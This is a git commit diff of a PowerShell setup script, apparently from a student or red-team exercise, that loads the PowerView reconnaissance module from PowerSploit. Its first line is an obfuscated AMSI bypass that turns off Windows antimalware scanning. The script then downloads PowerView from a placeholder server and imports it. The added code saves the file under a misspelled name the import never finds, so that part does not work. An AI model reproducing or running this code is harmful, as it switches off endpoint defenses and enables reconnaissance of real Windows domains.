16600721f1257e65f311f73660339225cd0d3cb4
qmt8843 <qmt8843@rit.edu>
2024-11-01 01:47:32 -0400

    Made powerview work and added missing equals sign for all on line 4

--- setup-powerview.ps1
+++ setup-powerview.ps1
@@ -1,22 +1,20 @@
 [ReF]."`A$(echo sse)`mB$(echo L)`Y"."g`E$(echo tty)p`E"(( "Sy{3}ana{1}ut{4}ti{2}{0}ils" -f'iUt','gement.A',"on.Am`s",'stem.M','oma') )."$(echo ge)`Tf`i$(echo El)D"(("{0}{2}ni{1}iled" -f'am','tFa',"`siI"),("{2}ubl{0}`,{1}{0}" -f 'ic','Stat','NonP'))."$(echo Se)t`Va$(echo LUE)"($(),$(1 -eq 1))
 
-$dirUrl = "http://your.url.here:port/PowerView/"
-$destFolder "where\you\want\to\save\files\to\PowerView"
+$dirUrl = "http://your.url.here:port/PowerSploit/Recon/"
+$destFolder = "where\you\want\to\save\files\to\PowerSploit\Recon"
 
-# if (!(Test-Path -Path $destFolder)) {
-#     New-Item -ItemType Directory -Path $destFolder | Out-Null
-# }
+if (!(Test-Path -Path $destFolder)) {
+    New-Item -ItemType Directory -Path $destFolder | Out-Null
+}
 
 Try{
     $pvUrl = $dirUrl + "PowerView.ps1"
-    $request = (Invoke-WebRequest -Uri $pvUrl).Content.ToString()
+    $localFilePath = $destFolder + "PowerVierrw.ps1"
+    Invoke-WebRequest -Uri $pvUrl -OutFile $localFilePath
 } Catch {}
 
-$pvContentBlock = [ScriptBlock]::Create($request)
-Import-Module -ScriptBlock $pvContentBlock
-
-# $pvPath = $destFolder + "\PowerView.ps1"
-# Import-Module $pvPath -Verbose
+$pvPath = $destFolder + "\PowerView.ps1"
+Import-Module $pvPath -Verbose
 
 function prompt{
     $currPath = Get-Location
